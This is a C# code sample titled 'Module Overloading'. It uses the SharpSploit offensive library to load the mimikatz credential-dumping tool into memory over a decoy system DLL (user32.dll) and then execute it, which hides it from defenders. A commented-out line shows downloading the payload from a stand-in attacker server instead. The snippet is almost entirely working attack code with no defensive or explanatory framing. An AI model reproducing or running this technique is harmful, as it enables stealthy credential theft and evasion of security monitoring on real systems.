## Module Overloading

```csharp

using System;
using System.IO;

namespace MapTest
{
    class Program
    {

        static void Main(string[] args)
        {

            string payload = @"C:\Users\thewover.CYBERCYBER\Source\Repos\ManualMapTest\ManualMapTest\mimikatz.exe";

            // Map a module to a file
            string decoyPath = @"C:\Windows\System32\user32.dll";

            byte[] payloadBytes = File.ReadAllBytes(payload);

            //Optionally, download the payload from a server into a byte array
            //byte[] payloadBytes = new System.Net.WebClient().DownloadData("http://evilserver.gov/kittenz.cute");

            //Overload, using specific decoy file
            SharpSploit.Execution.PE.PE_MANUAL_MAP metadata = SharpSploit.Execution.DynamicInvoke.Generic.OverloadModule(decoyPath, payloadBytes);

            //Overload, using randomly chosen decoy file
            //SharpSploit.Execution.PE.PE_MANUAL_MAP metadata = SharpSploit.Execution.DynamicInvoke.Generic.OverloadModule(payloadBytes);

            Console.WriteLine("[+] Module Address: " + metadata.ModuleBase);
            Console.WriteLine("[+] Module Name: " + metadata.ModuleName); //nothing when a module is loaded from memory
            Console.WriteLine("[+] Module Backing File: " + metadata.MemoryBackingFileName);

            Console.WriteLine("Hold fire!");
            Console.ReadLine();
            Console.WriteLine("Firing!");

            SharpSploit.Execution.DynamicInvoke.Generic.CallMappedPEModule(metadata.PEINFO, metadata.ModuleBase);

            //==========================================================[Sleep]
            while (true)
            {
                System.Threading.Thread.Sleep(10000);
            }
        }
    }
}

```